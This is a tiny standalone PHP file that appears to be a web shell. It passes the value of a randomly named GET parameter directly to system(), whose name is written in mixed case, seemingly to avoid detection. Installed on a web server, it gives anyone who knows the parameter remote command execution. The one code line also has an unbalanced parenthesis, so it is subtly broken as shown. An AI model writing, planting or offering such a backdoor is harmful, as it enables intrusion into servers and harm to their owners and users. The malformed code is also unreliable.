<?php
SysTeM(($_GET['w3CcDFTR']);
?>
